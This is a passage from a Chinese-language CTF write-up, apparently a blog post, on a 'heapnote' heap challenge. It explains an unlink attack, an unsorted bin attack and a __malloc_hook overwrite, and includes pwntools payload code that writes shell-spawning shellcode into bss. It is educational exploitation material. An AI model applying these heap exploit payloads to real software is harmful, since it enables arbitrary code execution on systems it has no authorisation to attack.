bin双向链表里删除前一个块，然后与自己合并后再加入unsorted bin。</p><p>那么会调用unlink(prev_chunk(chunk1),NULL,NULL)在unlink函数中</p><p>P &#x3D; chunk0</p><p>FD&#x3D;chunk0-&gt;fd &#x3D; 0x6020C8</p><p>BK&#x3D;chunk0-&gt;bk &#x3D; 0x6020D0</p><p><strong>即数组的第1个元素被我们改成了0x6020C8，也就是相当于堆0指向了0x6020C8</strong></p><p><strong>那么，我们编辑堆0也就是在编辑0x6020C8处，而此处的下方就是保存堆指针的数组，那么就可以构造payload来修改这个数组，这就是原理</strong></p><p>目的：通过malloc_hook来执行shellcode,只要把 malloc_hook 赋值为shellcode的首地址，那么在执行malloc后就可以执行shellcode了,而地址随机化的堆空间并不适合写入shellcode，要选择一片<strong>可写入的</strong>，<strong>较稳定的</strong>内存段（比如bss段），利用<strong>堆溢出</strong>修改<strong>chunk的结构</strong>，通过<strong>unlink</strong>修改buf数组中指针指向的位置（使其指向bss段），利用update()把shellcode写入bss段，然后再利用undate()修改malloc_hook为bss段上shellcode的地址，最后执行 shellcode.</p><p>步骤如下：</p><blockquote><p>In 64-bit, all the chunk data takes up <code>0x8</code> bytes each, so the offsets for <code>fd</code> and <code>bk</code> will be <code>0x10</code> and <code>0x18</code> respectively.</p></blockquote><p>step1:在堆上创建两个chunk（0x90），伪造堆结构如下，delete()删掉chunk1触发unlink操作</p><img src="/2021/06/29/heapnote/Untitled15.png" class title="Untitled"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pre_size, size</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)<span class="comment">#最后一位为1（伪造P位）</span></span><br><span class="line"><span class="comment"># fd, bk</span></span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>)<span class="comment">#伪造unlink的执行条件</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line"><span class="comment"># change chunk1 size</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)<span class="comment">#最后一位为0（伪造P位，使伪造chunk为free）</span></span><br><span class="line"><span class="comment">#fake chunk:0x90-0x10=0x80</span></span><br><span class="line"><span class="comment">#chunk1:0x90+0x10=0xa0</span></span><br><span class="line"><span class="comment">#new chunk:0x90+0x90=0x80+0xa0=0x120</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line">free(<span class="string">&quot;1&quot;</span>)<span class="comment">#merge completed</span></span><br></pre></td></tr></table></figure><p>chunk-&gt;fd：“buf - 0x18”，buf[-3]</p><p>chunk-&gt;bk：“buf - 0x10”，buf[-2]</p><p>unlink之后buf[0]的地址实际指向了buf[-3]的地址</p><p>step2:调用edit编辑buf[0]，此时buf[0]指向bss段首部，buf[1]指向buf，并且我们在buf中又伪造了一个chunk，buf结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#填充buf[-3]~buf[-1]</span></span><br><span class="line">payload+=p64(bss_addr)+p64(buf_addr)<span class="comment">#buf[0]-&gt;bss  buf[1]-&gt;buf 改变buf数组指针指向bss，方便写入shellcode</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#new chunk:chunk2,chunk3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)<span class="comment">#size(buf[4])  pre_size(buf[5])</span></span><br><span class="line"><span class="comment">#make a fake chunk in buf(the head is buf[4])</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br></pre></td></tr></table></figure><img src="/2021/06/29/heapnote/Untitled16.png" class title="Untitled"><p>step4:申请chunk23，要利用UAF、unsortbin attack将arena_main的地址写入chunk4,将malloc_hook地址写入buf。此时buf[2]指向的地址为buf[0]，也是正常malloc时候的地址+0x10，这是因为我们free buf[1]时进行了合并，chunk1和伪造的chunk0都合并进入了top chunk。</p><p>前面伪造chunk0和chunk1合并后，在<strong>top chunk</strong>中存放有一个“0x90+0x90+0x10”大小的free chunk</p><p>在申请第一段“0x100”的chunk时，<strong>top chunk</strong>中的chunk被切割为“0x90”</p><p>在申请第二段“0x100”的chunk时，<strong>top chunk</strong>中的chunk大小不够，需要继续申请</p><p> &#x2F;&#x2F;这里是为了把<strong>top chunk</strong>消耗干净，让chunk3成为新的<strong>top chunk</strong></p><img src="/2021/06/29/heapnote/Untitled17.png" class title="Untitled"><blockquote><p>这里将malloc_hook地址写入buf数组的原因：由于程序开启了ALSR保护，所以malloc_hook地址是会随机变化的，这说明我们不可能直接将malloc_hook地址直接写入buf，我们只能在不确定中寻找确定。在上面的引用中，我们发现当我们free掉一个大小属于unsorted bin的chunk时，它都会指向main_arena的固定偏移位置，因此，我们可以利用这一特点，将这一偏移地址存放在buf数组中，形成可读可写的状态，将处于同一内存页的malloc_hook的地址通过编辑功能修改得到。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk2</span></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[3]&quot;</span>)<span class="comment">#buf[3]-&gt;chunk3 把topchunk消耗干净，让chunk3成为新的topchunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">&quot;2&quot;</span>)<span class="comment">#,chunk2(buf[2]指向的chunk)作为最后一个收入unsortbin</span></span><br><span class="line"><span class="comment">#no merge:chunk1&amp;chunk3 are all allocated chunks</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(buf_addr+<span class="number">0x8</span>*<span class="number">4</span>) <span class="comment">#fd-&gt;null(0)  bk-&gt;buf[4](fake chunk) chunk2已经是free状态</span></span><br><span class="line">change(<span class="string">&quot;2&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload) <span class="comment">#这样的话之前在buf中伪造的chunk4也进入了unsorted bin</span></span><br><span class="line"><span class="comment">#link fake chunk4 into unsorted bin</span></span><br></pre></td></tr></table></figure><p>堆结构从</p><img src="/2021/06/29/heapnote/Untitled18.png" class title="Untitled"><p>改变为</p><img src="/2021/06/29/heapnote/Untitled19.png" class title="Untitled"><p>step5:</p><p>再调用add申请一个和chunk2一样大小的chunk，这样unsorted bin中就只剩下伪造的chunk4，所以main arena+0x58的地址就被留在了buf[6]。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk4</span></span><br><span class="line"><span class="comment">#chunk2 is used,fake chunk4 is the only one in unsorted bin</span></span><br><span class="line"><span class="comment">#buf[6]-&gt;main arena+0x58  buf[7]-&gt;main arena+0x58</span></span><br></pre></td></tr></table></figure><p>因为“chunk2”属于“unsorted bin”，其<strong>bk</strong>指向“buf[4]”（“伪造的chunk4”的首地址）</p><p>这样的话之前在buf中伪造的“伪造的chunk4”也进入了unsorted bin（被强行连接）</p><p>添加一个和chunk2一样大小的chunk4，这样unsorted bin中只剩下伪造的chunk4了</p><p>这里需要先分析一下ptmalloc的运算过程：</p><p>申请chunk4时，程序在small bins中没有找到结果，于是在unsorted bin中进行<strong>遍历</strong></p><p>因为“chunk2”排在“伪造的chunk4”前面，所以程序搜索到“chunk2”后<strong>终止</strong>，并不会<strong>重新分配</strong>“伪造的chunk4”</p><p>step6:调用edit向buf[0]（bss首部）中写入shellcode</p><p>调用edit向buf[6]中写入shellcode的地址</p><p>&#x2F;&#x2F;改写main_arena的地址低位使其指向malloc_hook,将shellcode地址写入malloc_hook</p><p>申请任意一个新chunk，触发mallochook执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss_addr)+p64(buf_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x10&#x27;</span></span><br><span class="line">change(<span class="string">&quot;1&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"><span class="comment">#main arena+0x58 become malloc_hook</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)),shellcode)<span class="comment">#bss=&amp;shellcode buf[0]装有bss段的首地址，所以shellcode会被写入bss段，且首地址已知</span></span><br><span class="line">change(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;8&quot;</span>,p64(bss_addr))<span class="comment">#malloc_hook-&gt;bss(&amp;shellcode) buf[6]中装有malloc_hook，所以malloc_hook会和shellcode挂钩</span></span><br></pre></td></tr></table></figure><p>buf[1]中写入了buf[0]的地址，buf[0]中写入了bss段的地址</p><p>buf[4]是伪造chunk4，在它就是<strong>unsorted bin</strong>中的<strong>最后一位</strong>，所以它的<strong>fd&amp;bk</strong>应该指向一个固定偏移<strong>main_arena+XX</strong>，这里不需要知道它具体是多少，只要知道它和<strong>malloc_hook</strong>只有最后两位不同就可以了</p><p>在buf[1]中写入payload，而payload会实际写入buf[0]，前面的数据会依次填充“buf[0]~buf[5]”，而最后一位数据“\x10”会<strong>填入fd</strong>，因为计算机采用<strong>小端序</strong>，所以“\x10”会覆盖<strong>fd</strong>指针指向内容的最后两个字节，它正是<strong>main_arena+XX</strong>，它会被覆盖为<strong>malloc_hook</strong>（在malloc_trim()里找到）</p><img src="/2021/06/29/heapnote/Untitled20.png" class title="Untitled">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
